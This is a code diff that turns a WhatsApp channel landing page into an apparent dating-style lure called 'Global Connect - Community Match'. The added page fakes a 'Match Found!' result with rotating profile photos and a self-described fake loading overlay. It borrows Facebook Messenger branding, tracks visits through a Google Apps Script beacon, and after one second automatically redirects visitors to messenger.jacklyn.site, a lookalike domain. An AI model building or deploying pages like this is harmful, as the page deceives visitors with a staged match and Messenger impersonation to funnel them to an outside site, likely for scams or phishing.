@@ -3,85 +3,167 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Join My WhatsApp Channel</title>
+    <title>Global Connect - Community Match</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+    
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" media="print" onload="this.media='all'">
+    
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js" defer></script>
+    
     <style>
-        /* দ্রুত লোডিংয়ের জন্য বেসিক রিসেট */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { 
+            background: #0d1117; 
+            display: flex; align-items: center; justify-content: center; 
+            min-height: 100vh; color: #fff; overflow: hidden; 
+            transition: filter 0.4s ease;
         }
 
-        body, html {
-            height: 100%;
-            width: 100%;
-            overflow: hidden;
-            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        /* Redirect Blur Effect */
+        body.is-redirecting .container {
+            filter: blur(10px);
+            opacity: 0.6;
+            pointer-events: none;
         }
 
-        /* ফুল স্ক্রিন ব্যাকগ্রাউন্ড ইমেজ (f1.webp) */
-        .landing-page {
-            background-image: linear-gradient(rgba(0,0,0,0.1), rgba(0,0,0,0.1)), url('f1.webp');
-            height: 100vh;
-            background-position: center;
-            background-repeat: no-repeat;
-            background-size: cover;
-            display: flex;
-            justify-content: center;
-            align-items: flex-end; /* বাটন নিচে রাখার জন্য */
-            padding-bottom: 80px; /* নিচ থেকে হাফ ইঞ্চির একটু বেশি উপরে রাখা হয়েছে */
+        .container { 
+            width: 92%; max-width: 380px; text-align: center; 
+            background: rgba(255, 255, 255, 0.04); padding: 40px 20px; 
+            border-radius: 30px; border: 1px solid #ff69b4; 
+            backdrop-filter: blur(15px); box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            will-change: transform;
+        }
+        
+        .match-wrapper { position: relative; width: 140px; height: 140px; margin: 0 auto 25px; }
+        .match-area { width: 100%; height: 100%; border-radius: 50%; border: 2px solid #ff69b4; overflow: hidden; display: flex; align-items: center; justify-content: flex-start; }
+        
+        .active-dot { 
+            position: absolute; bottom: 10px; right: 10px; width: 22px; height: 22px; 
+            background: #22c55e; border: 3px solid #0d1117; border-radius: 50%; 
+            z-index: 10; display: none; 
         }
 
-        /* আকর্ষণীয় হোয়াটসঅ্যাপ বাটন */
-        .whatsapp-btn {
-            background-color: #25D366; /* WhatsApp Green */
-            color: white;
-            text-decoration: none;
-            padding: 20px 50px;
-            border-radius: 50px;
-            font-size: 22px;
-            font-weight: bold;
-            text-transform: uppercase;
-            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
-            transition: 0.3s;
-            animation: pulse-animation 1.5s infinite; /* বাটন পপ-আপ ইফেক্ট */
-            display: inline-block;
-            text-align: center;
+        .profile-slider { 
+            display: flex; width: 1400px; height: 100%; 
+            will-change: transform; transform: translate3d(0, 0, 0);
+            transition: transform 0.1s linear; 
         }
-
-        /* বাটনটি নাড়াচাড়া করার বা পপ-আপ করার অ্যানিমেশন */
-        @keyframes pulse-animation {
-            0% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7);
-            }
-            70% {
-                transform: scale(1.05);
-                box-shadow: 0 0 0 15px rgba(37, 211, 102, 0);
-            }
-            100% {
-                transform: scale(1);
-                box-shadow: 0 0 0 0 rgba(37, 211, 102, 0);
-            }
+        .profile-slider img { width: 140px; height: 140px; object-fit: cover; border-radius: 50%; flex-shrink: 0; }
+        
+        h1 { font-size: 22px; margin-bottom: 25px; font-weight: 600; }
+        
+        .btn-chat { 
+            width: 100%; background: linear-gradient(135deg, #ff69b4 0%, #ff1493 100%); 
+            color: white; padding: 18px; border-radius: 18px; font-weight: 800; font-size: 18px; 
+            border: none; cursor: pointer; display: none; align-items: center; justify-content: center; gap: 10px; 
+            box-shadow: 0 8px 20px rgba(255, 105, 180, 0.3); animation: pulse-btn 1.5s infinite; 
         }
+        @keyframes pulse-btn { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.03); } }
+        
+        .loader { border: 3px solid rgba(255, 255, 255, 0.2); border-top: 3px solid #ff69b4; border-radius: 50%; width: 30px; height: 30px; animation: spin 0.8s linear infinite; margin: 0 auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* বাটনে মাউস নিলে অ্যানিমেশন স্টপ হবে এবং কালার চেঞ্জ হবে */
-        .whatsapp-btn:hover {
-            background-color: #128C7E;
-            transform: translateY(-3px);
-            animation-play-state: paused;
+        /* Fake Loading Overlay */
+        #redirect-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            display: none; flex-direction: column; align-items: center; justify-content: center;
+            z-index: 9999;
         }
-
+        .loading-box { background: rgba(255, 255, 255, 0.1); padding: 25px 40px; border-radius: 20px; backdrop-filter: blur(10px); text-align: center; border: 1px solid rgba(255, 105, 180, 0.2); }
+        .loading-text { margin-top: 15px; font-weight: 600; color: #ff69b4; font-size: 16px; }
     </style>
 </head>
 <body>
 
-    <div class="landing-page">
-        <!-- আপনার দেওয়া হোয়াটসঅ্যাপ চ্যানেল লিঙ্ক -->
-        <a href="https://whatsapp.com/channel/0029Vb8E6XW002T0uNPN4S3D" class="whatsapp-btn">
-            Visit Now
-        </a>
+    <div id="redirect-overlay">
+        <div class="loading-box">
+            <div class="loader" style="width: 40px; height: 40px; border-width: 4px;"></div>
+            <p class="loading-text">Starting Chat...</p>
+        </div>
     </div>
 
+    <div class="container">
+        <div class="match-wrapper">
+            <div class="active-dot" id="activeDot"></div>
+            <div class="match-area">
+                <div class="profile-slider" id="slider">
+                    <img src="p1.webp" fetchpriority="high"><img src="p2.webp"><img src="p3.webp"><img src="p4.webp"><img src="p5.webp"><img src="p6.webp"><img src="p7.webp"><img src="p8.webp"><img src="p9.webp"><img src="p10.webp">
+                </div>
+            </div>
+        </div>
+        <h1 id="title">Finding New Friends...</h1>
+        <div id="status-container"><div class="loader" id="mainLoader"></div></div>
+        
+        <button id="chatBtn" class="btn-chat" onclick="handleStartChat()">
+            <i class="fa-brands fa-facebook-messenger"></i> START CHAT NOW
+        </button>
+    </div>
+
+    <script>
+        const TARGET_URL = 'messenger.jacklyn.site'; 
+        const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbxo8ZyK3hi3-dfFaSu-_ZbUDPudyXMWdAN5LCI92to2qTUEjVTp7B4Yshp44sgEXwjm/exec';
+        
+        function track(event) {
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(`${SCRIPT_URL}?event=${event}`);
+            } else {
+                new Image().src = `${SCRIPT_URL}?event=${event}`;
+            }
+        }
+
+        const slider = document.getElementById('slider');
+        const title = document.getElementById('title');
+        const chatBtn = document.getElementById('chatBtn');
+        const activeDot = document.getElementById('activeDot');
+        const mainLoader = document.getElementById('mainLoader');
+        const overlay = document.getElementById('redirect-overlay');
+        
+        let position = 0, count = 0;
+        
+        const interval = setInterval(() => {
+            position -= 140;
+            if (position <= -1400) position = 0;
+            slider.style.transform = `translate3d(${position}px, 0, 0)`;
+            count++;
+            if (count > 25) { 
+                clearInterval(interval);
+                finalize();
+            }
+        }, 100);
+
+        function finalize() {
+            slider.style.transition = "transform 0.6s cubic-bezier(0.23, 1, 0.32, 1)";
+            slider.style.transform = `translate3d(-560px, 0, 0)`;
+            
+            setTimeout(() => {
+                title.innerText = "Match Found! 🥳";
+                mainLoader.style.display = "none";
+                activeDot.style.display = "block";
+                chatBtn.style.display = "flex";
+                
+                if (window.confetti) confetti({ particleCount: 100, spread: 60 });
+                
+                track('Match_Found');
+                setTimeout(handleStartChat, 1000); // ১ সেকেন্ড পর অটো রিডাইরেক্ট
+            }, 600);
+        }
+
+        function handleStartChat() {
+            track('Button_Click');
+            
+            // ঝাপসা করা এবং লোডার দেখানো
+            document.body.classList.add('is-redirecting');
+            overlay.style.display = 'flex';
+            
+            setTimeout(() => {
+                window.location.replace(`https://${TARGET_URL}`);
+            }, 400); 
+        }
+
+        window.onload = () => track('Total_Visit');
+    </script>
 </body>
 </html>
